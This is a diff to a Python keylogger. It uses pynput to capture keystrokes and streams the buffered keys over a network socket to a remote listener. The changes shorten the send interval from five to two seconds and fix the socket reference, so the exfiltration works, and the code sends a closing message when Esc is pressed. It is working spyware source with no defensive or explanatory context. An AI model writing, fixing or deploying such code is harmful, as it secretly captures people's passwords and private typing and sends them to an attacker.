@@ -1,4 +1,3 @@
-import os
 import socket
 from pynput.keyboard import Key, Listener
 import datetime
@@ -24,12 +23,12 @@ class Logger:
     def on_release(self, key):
         cur_time = datetime.datetime.now()
         # Log if a long enough time has elapsed
-        if cur_time - self.timestamp > datetime.timedelta(seconds=5):
-            s.sendall((self.str_holder[:-1]).encode('utf-8'))
+        if cur_time - self.timestamp > datetime.timedelta(seconds=2):
+            self.socket.sendall((self.str_holder[:-1]).encode('utf-8'))
             self.str_holder = str(key).strip("'")
             
         if key == Key.esc:
-            s.sendall(("commit sudoku").encode('utf-8'))
+            self.socket.sendall(("commit sudoku").encode('utf-8'))
             self.socket.close()
             return False
         
